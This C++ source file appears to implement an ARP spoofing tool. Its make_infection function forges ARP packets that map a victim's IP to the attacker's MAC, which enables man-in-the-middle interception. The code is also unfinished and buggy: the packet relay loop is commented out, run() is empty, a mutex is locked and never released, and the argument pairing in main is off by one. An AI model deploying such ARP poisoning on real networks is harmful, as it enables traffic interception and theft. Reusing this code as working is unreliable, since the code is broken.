#include "arpspoof.h"
#include<unistd.h>
// ARP(Operation opcode, Ipv4Addr target_ip, Ipv4Addr sender_ip, HWAddr target_hw, HWAddr sender_hw);
Ethernet ArpSpoofer::make_infection(session sess) {
    auto ether = Ethernet(sess.sender_mac, iface.mac(), Ethernet::EtherType::ARP);
    ether/=ARP(ARP::Operation::REQ, sess.target_ip, sess.sender_ip, iface.mac(), sess.sender_mac);
    return ether;
}

void ArpSpoofer::push_relay_packet(pcap_t* desc)
{
    
    char errbuf[PCAP_ERRBUF_SIZE] = {
        0,
    };
    sleep(1);
    mtx.lock();    
    int res = 0;
    pcap_pkthdr* hdr;
    const u_char* pkt;
        
    res = pcap_next_ex(desc, &hdr,&pkt);
    
    // while((res = pcap_next_ex(desc, &hdr,&pkt))) {
        // std::cout << "=" << std::endl;
    //     if(res == 0) continue;           
    //     Ethernet my_eth = Ethernet();
    //     IP my_ip = IP();        
    //     bytes b1 = bytes(pkt, pkt+sizeof(Ethernet));
    //     bytes b2 = bytes(pkt+sizeof(Ethernet), pkt+sizeof(Ethernet)+sizeof(IP));
    //     my_eth.deserialize(b1);
    //     my_ip.deserialize(b2);                     
    //     for(auto s : sessions) {
    //         switch (htons((int16_t)my_eth.type()))
    //         {
    //         case (uint16_t)Ethernet::EtherType::ARP :{
    //             if ( my_eth.dst_mac().mac() == s.target_mac.mac() ) 
    //                 mtx.lock();
    //                 relay_qeue.push( make_infection(s).serialize() );                
    //                 mtx.unlock();
    //             break;
    //         }
    //         case (uint16_t)Ethernet::EtherType::IP :{
    //             if ( my_ip.dest_ip().ip() == s.target_ip.ip() )  {                    
    //                 mtx.lock();
    //                 relay_qeue.push( 
    //                     Ethernet(iface.mac(), s.target_mac,Ethernet::EtherType::IP).serialize()
    //                 );
    //                 mtx.unlock();       
    //             }
    //             break;
    //         }
    //         default:
    //             break;
    //         }
    //     }        
    // }
}

void ArpSpoofer::run()
{        
    
}

std::thread ArpSpoofer::relay_thread() {
    char errbuf[PCAP_ERRBUF_SIZE] = { 0, };
    std::cout << iface.dev() << std::endl;
    pcap_t* desc = pcap_open_live(iface.dev().c_str(), 8192, 0, 512, errbuf);
    printf("%s\n", errbuf);
    int res = 0;
    pcap_pkthdr* hdr;
    const u_char* pkt;
    return std::thread(
        [=]{push_relay_packet(desc);}
    );
}

int main(int argc, char* argv[]) {
    vector<session> ss;
    for(int i = 2; i < argc-1; i++) {        
        ss.push_back(session(string(argv[i]),string(argv[i+1]),string(argv[1])));
    }
    ArpSpoofer ar = ArpSpoofer(string(argv[1]),ss);
    auto t1 = ar.relay_thread();    
    t1.join();
    // ar.run();
}